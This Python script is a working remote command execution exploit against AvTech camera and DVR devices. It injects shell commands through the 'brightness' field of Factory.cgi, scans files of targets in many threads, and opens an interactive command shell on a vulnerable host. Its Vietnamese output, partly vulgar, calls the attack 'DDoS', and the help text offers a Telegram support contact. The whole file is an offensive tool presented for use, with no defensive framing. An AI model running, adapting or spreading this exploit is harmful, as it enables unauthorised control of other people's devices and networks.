import socket
import argparse
import requests
import threading
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.formatted_text import HTML
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class AvTechRCEExploit:
    def __init__(self, target_url=None, targets_file=None, max_workers=10):
        self.target_url = target_url
        self.targets_file = targets_file
        self.max_workers = max_workers
        self.command = "PAYLOAD"
        self.vuln_path = '/cgi-bin/supervisor/Factory.cgi'
        self.headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    def _generate_payload(self, command=None):
        if command:
            return f'action=white_led&brightness=$({command} 2>&1) #'
        return 'action=white_led&brightness=$(echo%20CHECK_UNIQUE_VULN 2>&1) #'

    def is_vulnerable(self):
        payload = self._generate_payload()
        try:
            response = requests.post(self.target_url + self.vuln_path, headers=self.headers, data=payload, timeout=10, verify=False)
            if "CHECK_UNIQUE_VULN" in response.text:
                print(f"[+] ĐÃ TÌM THẤY LỖ HỔNG CỦA WEB -BY QUY: {self.target_url}")
                return True
        except Exception as e:
            print(f"[-] LỖI KIỂM TRA LỔ HỔNG: {e}")
        return False

    def execute_command(self):
        payload = self._generate_payload(self.command)
        print("[*] ĐANG KIỂM TRA LỖ HỎNG VUI LÒNG CHỜ...")
        if self.is_vulnerable():
            try:
                response = requests.post(self.target_url + self.vuln_path, headers=self.headers, data=payload, timeout=10, verify=False)
                print(f"[+] DANG DDOS WEB LỒN ĐÓ: {response.text}")
            except Exception as e:
                print(f"[-] LỖI VUI LÒNG CHẠY LẠI: {e}")
        else:
            print("[-] WEB NÀY MẠNH ĐẤY HUHU")

    def start_interactive_session(self):
        print("[*] ĐANG KHỞI CHẠY SHELL...")
        session = PromptSession(history=InMemoryHistory())
        print("[+] CHẠY THÀNH CÔNG SHELL")

        while True:
            try:
                cmd_input = session.prompt(HTML("<ansiyellow><b>Shell> </b></ansiyellow>"), default="").strip()
                if cmd_input.lower() == "exit":
                    print("[*] THOÁT TOOL TẠM BIỆT ")
                    break
                elif cmd_input.lower() == "clear":
                    self._clear_screen()
                    continue

                self.command = cmd_input
                self.execute_command()

            except KeyboardInterrupt:
                print("\n[-] ĐANG THOÁT SHELL")
                break

    def scan_targets_from_file(self):
        try:
            with open(self.targets_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]

            with alive_bar(len(targets), title='DANG QUET MUC TIÊU NIEU KHÔNG DIE THI CHAY LAI ', bar="smooth", enrich_print=False) as progress_bar:
                with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    futures_to_target = {executor.submit(self._scan_single_target, target): target for target in targets}
                    for future in as_completed(futures_to_target):
                        progress_bar()

        except Exception as e:
            print(f"[-] LỖI QUÉT FILE MAY NG VC: {e}")

    def _scan_single_target(self, target):
        self.target_url = target
        if self.is_vulnerable():
            print(f"[+] ĐÃ TÌM THẤY LỖ HỔNG WEB: {target}")

    @staticmethod
    def _clear_screen():
        print("\033c", end="")


def main():
    parser = argparse.ArgumentParser(description="NIẾU CẦN HỖ TRỢ THÌ VUI LÒNG GỬI TIN NHẮN CHO ADMIN TELE:thanngheo2002")
    parser.add_argument("-u", "--url", type=str, help="URL WEB CẦN DDOS")
    parser.add_argument("-f", "--file", type=str, help="FILE CHỨA LINK CẦN DDOS")
    parser.add_argument("-t", "--threads", type=int, default=10, help="NHẬP threads")

    args = parser.parse_args()

    if args.url:
        exploit_instance = AvTechRCEExploit(target_url=args.url, max_workers=args.threads)
        exploit_instance.start_interactive_session()
    elif args.file:
        exploit_instance = AvTechRCEExploit(targets_file=args.file, max_workers=args.threads)
        exploit_instance.scan_targets_from_file()
    else:
        print("[-] URL CẦN DDOS HOẶC FILE.")
        parser.print_help()


if __name__ == "__main__":
    main()